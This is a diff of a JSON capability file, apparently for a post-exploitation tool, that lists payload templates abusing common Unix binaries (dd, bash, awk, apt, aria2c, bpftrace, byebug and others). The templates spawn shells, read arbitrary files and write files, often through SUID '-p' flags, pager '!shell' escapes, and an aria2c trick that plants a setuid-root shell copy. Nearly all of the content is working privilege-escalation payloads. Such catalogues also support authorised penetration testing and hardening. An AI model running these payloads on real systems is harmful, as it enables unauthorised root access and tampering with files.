@@ -1,136 +1,256 @@
-[
-	{
-		"name": "cat",
-		"read_file": "{command} {lfile}"
-	},
-	{
-		"name": "bash",
-		"shell": {
-			"script": "{command}", 
-			"suid": ["-p"]
+{
+	// Each item is a list of capabilities for this binary
+	"dd": [
+		{
+			// This is a read capability
+			"type": "read",
+			// No other commands need to be executed besides the command
+			// "command" exands to the binary path and any arguments provided
+			// If the data needs to be dealt with earlier, you can use "{data}"
+			// here.
+			"payload": "{command} 2>/dev/null",
+			// This is used to pass arguments to the application (auto-merged
+			// into "{command}".
+			"args": ["if={lfile}"],
+			// Prepends arguments, if any to the "args" for setuid context.
+			"suid": [],
+			// Input which needs to be passed to the application. All insertions
+			// work here (such as {lfile}, {command}), but also {data} if you are
+			// streaming the data to the remote application.
+			"input": "",
+			// If needed, specify some data that must be sent to exit the remote
+			// application after the read is finished.
+			// "exit": "{ctrl_c}",
+			// This specifies how to handle the data. There can be a few
+			// different values here:
+			//     - raw -> the data is unchanged and the controlling terminal
+			//         is set to raw mode for effective reading. This mode
+			//         requires a known data length and the command will fail
+			//         without it.
+			//     - print -> the data is unchanged, but the controlling
+			//         terminal is not changed to raw mode. Only printable 
+			//         data is safe from TTY translation.
+			//     - base64 -> all data is converted from base64. Data sent
+			//         to the remote process should be in  base64 form, and the
+			//         tty is not set to raw mode.
+			//     - hex -> same as base64, but base16 instead.
+			"stream": "raw"
 		},
-		"read_file": "{path} -p -c \"{cat} {lfile}\"",
-		"write_file": {
-			"type": "base64",
-			"payload": "{path} -p -c \"echo -n {data} | {base64} -d > {lfile}\""
+		{
+			"type": "write",
+			"stream": "raw",
+			"payload": "{command} of={lfile} iflag=count_bytes count={length}"
+		}
+	],
+	// Another example
+	"bash": [
+		{
+			"type": "shell",
+			"stream": "print",
+			"suid": ["-p"],
+			"exit": "exit"
 		},
-		"command": "{path} -p -c {command}"
-	},
-	{
-		"name": "apt-get",
-		"shell": {
-			"need": ["changelog", "apt"],
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["-c", "'{cat} {lfile}'"],
+			"suid": ["-p"],
+			"exit": "{ctrl_d}"
+		},
+		{
+			"type": "write",
+			"stream": "base64",
+			"payload": "{command}",
+			"args": ["-c", "{base64} -d > {lfile}"],
+			"suid": ["-p"],
+			"exit": "{ctrl_d}{ctrl_d}"
+		}
+	],
+	"dash": [
+		{
+			"type": "shell",
+			"stream": "print",
+			"suid": ["-p"],
+			"exit": "exit"
+		},
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command} -c '{cat} {lfile}'",
+			"suid": ["-p"],
+			"exit": "{ctrl_d}"
+		},
+		{
+			"type": "write",
+			"stream": "base64",
+			"payload": "{command} -c '{base64} -d > {lfile}'",
+			"suid": ["-p"],
+			"exit": "{ctrl_d}"
+		}
+	],
+
+	"cat": [
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command} {lfile}"
+		},
+		{
+			"type": "write",
+			"stream": "base64",
+			"payload": "{base64} -d | {command} > {lfile}",
+			"args": [],
+			"exit": "ctrl_d"
+		},
+		{
+			"type": "write",
+			"stream": "print",
+			"payload": "{command} > {lfile}",
+			"args": [],
+			"exit": "{ctrl_d}"
+		}
+	],
+	"apt": [
+		{
+			"type": "shell",
+			"args": ["changelog", "apt"],
 			"input": "!{shell}\n",
 			"exit": "exit\nq\n"
 		}
-	},
-	{
-		"name": "apt",
-		"shell": {
-			"need": ["changelog", "apt"],
+	],
+	"apt-get": [
+		{
+			"type": "shell",
+			"args": ["changelog", "apt"],
 			"input": "!{shell}\n",
 			"exit": "exit\nq\n"
 		}
-	},
-	{
-		"name": "aria2c",
-		"shell": {
-			"script": "TF=$(mktemp); SHELL=$(mktemp); cp {shell} $SHELL; echo \"{chown} root:root $SHELL; {chmod} +sx $SHELL;\" > $TF;{chmod} +x $TF; {command}; sleep 1; $SHELL -p",
-			"need": ["--on-download-error=$TF","http://x"]
+	],
+	"aria2c": [
+		{
+			"type": "shell",
+			"payload": "export TF=$({mktemp}); export SH=$({mktemp}); {cp} {shell} $SH; echo \"{chown} root:root $SH; {chmod} +sx $SH\" > $TF; {chmod} +x $TF; {command}; sleep 1; $SH -p",
+			"input": "rm $TF; rm $SH; unset TF; unset $SH;\n",
+			"args": ["--on-download-error=$TF", "http://x"],
+			"exit": "exit"
 		}
-	},
-	{
-		"name": "ash",
-		"shell": {
-			"script": "{command}", 
-			"suid": ["-p"]
+	],
+	"ash": [
+		{
+			"type": "shell",
+			"stream": "print",
+			"suid": ["-p"],
+			"exit": "exit"
 		},
-		"read_file": "{path} -p -c \"cat {lfile}\"",
-		"write_file": {
-			"type": "base64",
-			"payload": "{path} -p -c \"echo -n {data} | {base64} -d > {lfile}\""
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command} -c '{cat} {lfile}'",
+			"suid": ["-p"],
+			"exit": "{ctrl_c}"
 		},
-		"command": "{path} -p -c {command}"
-	},
-	{
-		"name": "awk",
-		"shell": {
-			"script": "{command} 'BEGIN {{system(\"{shell} -p\")}}'"
+		{
+			"type": "write",
+			"stream": "base64",
+			"payload": "{command} -c '{base64} -d > {lfile}'",
+			"suid": ["-p"],
+			"exit": "{ctrl_c}"
+		}
+	],
+	"awk": [
+		{
+			"type": "shell",
+			"payload": "{command} 'BEGIN {{system(\"{shell} -p\")}}'",
+			"exit": "exit"
 		},
-		"read_file": "{path} '//' {lfile}",
-		"write_file": {
-			"type": "base64",
-			"payload": "{path} -v LFILE={lfile} 'BEGIN {{ printf \"\" > LFILE; while ((\"echo \\\"{data}\\\" | base64 -d\" | getline) > 0){{ print >> LFILE }} }}'"
-		}
-	},
-	{
-		"name": "gawk",
-		"shell": {
-			"script": "{command} 'BEGIN {{system(\"{shell}\")}}'"
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command} // {lfile}"
 		},
-		"read_file": "{path} '//' {lfile}",
-		"write_file": {
-			"type": "base64",
-			"payload": "{path} -v LFILE={lfile} 'BEGIN {{ printf \"\" > LFILE; while ((\"echo \\\"{data}\\\" | {base64} -d\" | getline) > 0){{ print >> LFILE }} }}'"
-		}
-	},
-	{
-		"name": "base32",
-		"read_file": "{path} {lfile} | {path} -d"
-	},
-	{
-		"name": "base64",
-		"read_file": "{path} {lfile} | {path} -d"
-	},
-	{
-		"name": "bpftrace",
-		"shell": {
-			"script": "{command} -c {shell} -e 'END {{exit()}}'", 
-			"suid": ["-p"]
-		}
-	},
-	{
-		"name": "bundler",
-		"shell": {
-			"script": "{command} help",
-			"input": "!{shell}\n",
-			"exit": "exit\nq\n"
-		}
-	},
-	{
-		"name": "busctl",
-		"shell": {
-			"script": "{command}",
-			"input": "!{shell}\n",
-			"exit": "exit\nq\n"
-		}
-	},
-	{
-		"name": "byebug",
-		"shell": {
-			"script": "TF=$(mktemp);echo 'system(\"{shell}\")' > $TF;{command}  --no-stop -q $TF",
-			"need": [
-				"--no-stop",
-				"-q"
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command} 'BEGIN {{system(\"{cat} {lfile}\")}}'"
+		},
+		{
+			"type": "write",
+			"stream": "print",
+			"args": [
+				"-v", "LFILE={lfile}",
+				"'BEGIN {{ printf \"\" > LFILE; while ((getline) > 0){{ print >> LFILE }}'"
 			]
-		},
-		"read_file": "TF=$(mktemp);echo 'system(\"{cat} {lfile}\")' > $TF;{command}  --no-stop -q $TF",
-		"write_file": {
-			"type": "base64",
-			"payload": "TF=$(mktemp);echo 'system(\"echo {data} | {base64} -d > {lfile}\")' > $TF;{path} --no-stop -q $TF"
 		}
-	},
-	{
-		"name": "dash",
-		"shell": {
-			"script": "{command}", 
-			"suid": ["-p"]
+	],
+	"gawk": [
+		{
+			"type": "shell",
+			"payload": "{command} 'BEGIN {{system(\"{shell} -p\")}}'",
+			"exit": "exit"
 		},
-		"read_file": "{path} -p -c \"{cat} {lfile}\"",
-		"write_file": {
-			"type": "base64",
-			"payload": "{path} -p -c \"echo -n {data} | {base64} -d > {lfile}\""
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command} // {lfile}"
 		},
-		"command": "{path} -p -c {command}"
-	}
-]
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command} 'BEGIN {{system(\"{cat} {lfile}\")}}'"
+		},
+		{
+			"type": "write",
+			"stream": "print",
+			"args": [
+				"-v", "LFILE={lfile}",
+				"'BEGIN {{ printf \"\" > LFILE; while ((getline) > 0){{ print >> LFILE }}'"
+			]
+		}
+	],
+	"base32": [
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command} {lfile} | {base32} -d",
+			"args": []
+		}
+	],
+	"base64": [
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command} {lfile} | {base64} -d",
+			"args": []
+		}
+	],
+	"bpftrace": [
+		{
+			"type": "shell",
+			"args": ["-c", "'{shell} -p'", "-e", "'END {{exit()}}'"],
+			"suid": ["-p"],
+			"exit": "exit"
+		}
+	],
+	"busctl": [
+		{
+			"type": "shell",
+			"input": "!{shell}\n",
+			"exit": "exit\nq\n"
+		}
+	],
+	"byebug": [
+		{
+			"type": "shell",
+			"payload": "TF=$({mktemp}); echo 'system(\"{shell}\")' > $TF; {command}",
+			"args": ["--no-stop", "-q", "$TF"],
+			"exit": "exit"
+		},
+		{
+			"type": "read",
+			"payload": "TF=$({mktemp}); echo 'system(\"{cat} {lfile}\")' > $TF; {command}",
+			"args": ["--no-stop", "-q", "$TF"],
+			"exit": "exit"
+		}
+	]
+}
